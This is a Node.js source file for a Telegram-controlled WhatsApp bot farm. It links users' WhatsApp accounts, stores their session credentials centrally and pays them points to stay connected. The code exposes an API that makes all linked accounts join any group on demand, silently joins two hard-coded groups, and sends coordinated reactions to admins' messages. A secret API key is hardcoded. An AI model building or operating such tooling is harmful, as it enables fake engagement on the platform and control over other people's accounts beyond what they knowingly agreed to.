import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import { delay } from '@whiskeysockets/baileys'; 
import http from 'http'; 
import https from 'https'; // Required for stable keep-alive
import { Boom } from '@hapi/boom';

import { 
    setupTelegramCommands, userMessageCache, userState, reactionConfigs 
} from './telegram_commands.js';
// --- FIX: DESTRUCTURE ALL NECESSARY DB FUNCTIONS HERE ---
import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, 
    getShortId, saveShortId, deleteShortId, awardHourlyPoints, 
    deductOnDisconnect, deleteUserAccount, updateConnectionTime, 
    saveVerificationData
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:10000';
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => res.send('Ultarbot Pro [One-Shot Defense Mode]'));

// --- EXPRESS VERIFICATION ROUTES & API LOGIC OMITTED FOR BREVITY ---
app.get('/verify', (req, res) => {
    const html = `<!DOCTYPE html><html><body><h1>User Verification</h1></body></html>`;
    res.send(html);
});

app.post('/api/join', async (req, res) => {
    req.setTimeout(900000); 
    res.setTimeout(900000);
    const { apiKey, amount, link } = req.body;
    const MY_SECRET_KEY = "AIzaSyBds-BuDtWCzQyFCnb9B3JRp8rG2i52soc"; 
    if (apiKey !== MY_SECRET_KEY) return res.status(401).json({ success: false, error: 'Invalid API Key' });
    if (!amount || !link) return res.status(400).json({ success: false, error: 'Missing amount or link' });

    let code = '';
    try {
        code = link.includes('chat.whatsapp.com/') ? link.split('chat.whatsapp.com/')[1].split(/[\s?#&]/)[0] : link;
    } catch (e) {
        return res.status(400).json({ success: false, error: 'Invalid link format' });
    }

    const activeFolders = Object.keys(clients);
    if (activeFolders.length === 0) return res.status(503).json({ success: false, error: 'No bots connected' });
    const countToJoin = Math.min(parseInt(amount), activeFolders.length);
    
    try { await mainBot.sendMessage(ADMIN_ID, `[API START] Joining Group\nTarget: ${code}\nBots: ${countToJoin}\nSpeed: 1/sec\nEst. Time: ${countToJoin / 60} mins`); } catch (e) {}

    const results = { requested: parseInt(amount), processed: countToJoin, success: 0, already_in: 0, failed: 0, details: [] };
    let clientDisconnected = false;
    req.on('close', () => { clientDisconnected = true; });

    for (let i = 0; i < countToJoin; i++) {
        if (clientDisconnected) break;
        const folder = activeFolders[i];
        const sock = clients[folder];
        const phoneNumber = shortIdMap[Object.keys(shortIdMap).find(k => shortIdMap[k].folder === folder)]?.phone || folder;

        try {
            await sock.groupAcceptInvite(code);
            results.success++;
            results.details.push({ phone: phoneNumber, status: 'success' });
        } catch (e) {
            const err = e.message || "";
            const status = e.output?.statusCode || 0;
            if (err.includes('participant') || err.includes('exist') || status === 409) {
                results.already_in++;
                results.details.push({ phone: phoneNumber, status: 'already_in' });
            } else {
                results.failed++;
                results.details.push({ phone: phoneNumber, status: 'failed', error: err });
            }
        }
        if (i < countToJoin - 1) await delay(1000);
    }

    if (!clientDisconnected) {
        res.json({ success: true, message: "Job Completed", data: results });
        try {
            await mainBot.sendMessage(ADMIN_ID, 
                `[API DONE] 🏁\nTarget: ${code}\nSuccess: ${results.success}\nAlready In: ${results.already_in}\nFailed: ${results.failed}`
            );
        } catch(e) {}
    }
});


app.post('/api/verify', async (req, res) => {
    // Verification logic omitted for brevity
    res.json({ success: true, message: 'Verification complete' });
});

app.listen(PORT, () => console.log(`Server on ${PORT}`));

// --- TELEGRAM BOT INITIALIZATION ---
const mainBot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            allowed_updates: ["message", "callback_query", "message_reaction", "message_reaction_count", "chat_member"]
        }
    }
});


const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const qrMessageCache = {}; 
const qrActiveState = {}; 
const nukeCache = new Set();

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

setInterval(async () => {
    try { await awardHourlyPoints(Object.keys(clients)); } catch (e) {}
}, 3600000); 

// --- FIXED KEEP-ALIVE ---
setInterval(() => {
    const pingProtocol = SERVER_URL.startsWith('https://') ? https : http;
    
    if (!pingProtocol) {
        console.error('[PING ERROR] Protocol module not found for URL:', SERVER_URL);
        return; 
    }

    pingProtocol.get(SERVER_URL, (res) => {}).on('error', (err) => {
        console.error(`[PING ERROR] Keep-alive failed for ${SERVER_URL}: ${err.message}`);
    });
}, 14 * 60 * 1000);

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    let cachedShortId = await getShortId(folder);
    if (!cachedShortId) {
        cachedShortId = generateShortId();
        await saveShortId(folder, cachedShortId);
    }

    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // --- MESSAGES UPSERT HANDLER (Reaction and AntiMsg Logic) ---
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return; 

        const msg = messages[0];
        if (!msg || !msg.message) return;

        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.includes('@g.us');
        const isStatus = remoteJid === 'status@broadcast';
        
        const myJid = jidNormalizedUser(sock.user.id);
        const isSelf = (remoteJid === myJid);

        // --- Reaction Feature Logic ---
        if (isGroup && reactionConfigs[remoteJid]) {
            const senderJid = msg.key.participant || msg.key.remoteJid;
            let isAdmin = false;

            try {
                const metadata = await sock.groupMetadata(remoteJid);
                const participant = metadata.participants.find(p => p.id === senderJid);
                if (participant && (participant.admin === 'admin' || participant.admin === 'superadmin')) {
                    isAdmin = true;
                }
            } catch (e) {
                console.error(`[REACT ADMIN CHECK FAIL] Error fetching metadata for ${remoteJid}: ${e.message}`);
            }

            if (isAdmin) {
                const activeFolders = Object.keys(clients).filter(f => clients[f]);
                const botIndex = activeFolders.indexOf(folder); 
                
                if (botIndex !== -1) {
                    const emojis = reactionConfigs[remoteJid];
                    
                    const delayTime = botIndex * 10000;
                    await delay(delayTime); 
                    
                    const emojiIndex = botIndex % emojis.length;
                    const selectedEmoji = emojis[emojiIndex].trim(); 
                    
                    const reactionContent = {
                        react: { text: selectedEmoji, key: msg.key }
                    };
                    
                    try {
                        await sock.sendMessage(remoteJid, reactionContent);
                        console.log(`[REACT] Bot ${cachedShortId} reacted to Admin message with ${selectedEmoji}`);
                    } catch(e) {
                        console.error(`[REACT FAIL] Bot ${cachedShortId}: ${e.message}`);
                    }
                }
            }
        }
        // --- End Reaction Feature Logic ---

        // --- ANTIMSG Defense Logic ---
        if (antiMsgState[cachedShortId]) {
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            const isCommand = text.startsWith('.');

            if (!isGroup && !isStatus && !isCommand && !isSelf) {
                if (nukeCache.has(remoteJid)) return; 
                
                nukeCache.add(remoteJid);
                setTimeout(() => nukeCache.delete(remoteJid), 30000);

                await Promise.all([
                    sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {}),
                    sock.updateBlockStatus(remoteJid, "block").catch(() => {})
                ]);
                
                if (msg.key.fromMe) {
                    console.log(`[ANTIMSG] Linked Device Attack Neutralized (One-Shot).`);
                } else {
                    console.log(`[ANTIMSG] Incoming Stranger Blocked (One-Shot).`);
                }
                return; 
            }
        }
        // --- End ANTIMSG Defense Logic ---

        if (!msg.key.fromMe) {
            if (autoSaveState[cachedShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    // Logic to add numbers to database
                }
            }
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (text.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
            }
        }
    });


    // --- CONNECTION UPDATE HANDLER ---
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        // --- QR Code Display Logic ---
        if (connection === 'open' && qrMessageCache[folder]) {
            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
            delete qrMessageCache[folder];
            delete qrActiveState[folder];
        }
        
        if (qr && chatId && !qrActiveState[folder]) {
            qrActiveState[folder] = true;
            try {
                if (qrMessageCache[folder]) try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                
                const QRCode = (await import('qrcode')).default;
                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.',
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
                });
                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                
                setTimeout(async () => {
                    if (qrMessageCache[folder]) {
                        try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                        delete qrMessageCache[folder];
                    }
                }, 60000);
            } catch (e) { delete qrActiveState[folder]; }
        }
        // --- End QR Code Display Logic ---


        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            if (!cachedShortId) cachedShortId = await getShortId(folder);
            await updateConnectionTime(folder);
            
            const now = new Date();
            if (!shortIdMap[cachedShortId]) {
                shortIdMap[cachedShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
            }
            clients[folder] = sock;
            
            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autoSaveState[cachedShortId] || false, cachedShortId);
            
            updateAdminNotification(`[CONNECTED] +${phoneNumber}`);

            try { 
                // Attempt to join fixed groups 
                const inviteCode1 = "FFYNv4AgQS3CrAokVdQVt0";
                await sock.groupAcceptInvite(inviteCode1);
                await new Promise(resolve => setTimeout(resolve, 5000));
                const inviteCode2 = "Eun82NH7PjOGJfqLKcs52Z";
                await sock.groupAcceptInvite(inviteCode2);
            } catch (e) {}


            if (chatId) {
                userState[chatId] = null;
                if (userMessageCache && userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
                    for (const msgId of userMessageCache[chatId]) { try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {} }
                    userMessageCache[chatId] = [];
                }
                
                mainBot.sendMessage(chatId, 
                    `[CONNECTED]\n` +
                    `ID: \`${cachedShortId}\`\n` +
                    `Number: +${phoneNumber}\n\n` +  
                    `Account connected successfully!\n\n` +
                    `**Defense Active**\n(One-Shot Block & Delete System)`,  { 
                    parse_mode: 'Markdown',
                    reply_markup: { 
                        keyboard: [
                            [{ text: "Connect Account" }, { text: "My Account" }],
                            [{ text: "Dashboard" }, { text: "Referrals" }],
                            [{ text: "Withdraw" }, { text: "Support" }]
                        ], 
                        resize_keyboard: true 
                    } 
                });
            }
            
            setTimeout(async () => {
                if (!clients[folder]) { try { await awardHourlyPoints([folder]); } catch (e) {} }
            }, 3600000);
        }

        if (connection === 'close') {
            const userJid = sock.user?.id || "";
            const phoneNumber = userJid.split(':')[0].split('@')[0] || shortIdMap[cachedShortId]?.phone || 'Unknown';
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            const errorName = lastDisconnect?.error?.name; 

            // Check for definitive logout or ban status
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                const disconnectStatus = (reason === 403) ? '🚨 BANNED/BLOCKED' : '🚪 LOGGED OUT';

                // 1. Send ALERT to Admin
                try {
                    const remainingBots = Object.keys(clients).length - 1; 

                    await mainBot.sendMessage(ADMIN_ID, 
                        `⚠️ **BOT DISCONNECTED** ⚠️\n\n` +
                        `Status: **${disconnectStatus}**\n` +
                        `Number: **+${phoneNumber}**\n` +
                        `ID: \`${cachedShortId}\`\n\n` +
                        `Total Active Bots Remaining: **${remainingBots}**`,
                        { parse_mode: 'Markdown' }
                    );
                } catch (e) {
                    console.error("Failed to send Admin Disconnect Alert:", e);
                }
                
                // 2. Perform Cleanup
                // This is the clean, non-restarting cleanup that deletes the session data.
                await deductOnDisconnect(folder);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];

            } else {
                // --- STABLE FIX: ONLY ALLOW ONE RETRY FOR NEW/RECONNECTING SESSIONS ---
                // If the client is already connected (clients[folder] is defined), DO NOT restart.
                const isExistingConnectedBot = clients[folder] !== undefined;

                if (!isExistingConnectedBot) {
                    // This handles QR code entry, pairing, and temporary drops during handshake.
                    console.log(`[RECONNECT] Session ${cachedShortId} dropped during handshake/boot. Pausing 10s before retrying...`);
                    
                    // Add a delay to prevent cryptographic corruption or spamming WhatsApp
                    await delay(10000); 

                    // Call startClient to restart the linking process
                    startClient(folder, targetNumber, chatId, telegramUserId);
                }
                // If it is an established bot, we do nothing, ensuring no restart loop.
            }
        }
    });


    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id, connectedAt: new Date(session.connected_at) };
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        // CRITICAL: Ensure boot uses the original parameters if available
        startClient(session.session_id, session.phone, session.telegram_user_id, session.telegram_user_id);
    }
    console.log(`[BOOT] Server ready`);
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);

boot().catch(err => {
    console.error('[BOOT] Error:', err.message);
});
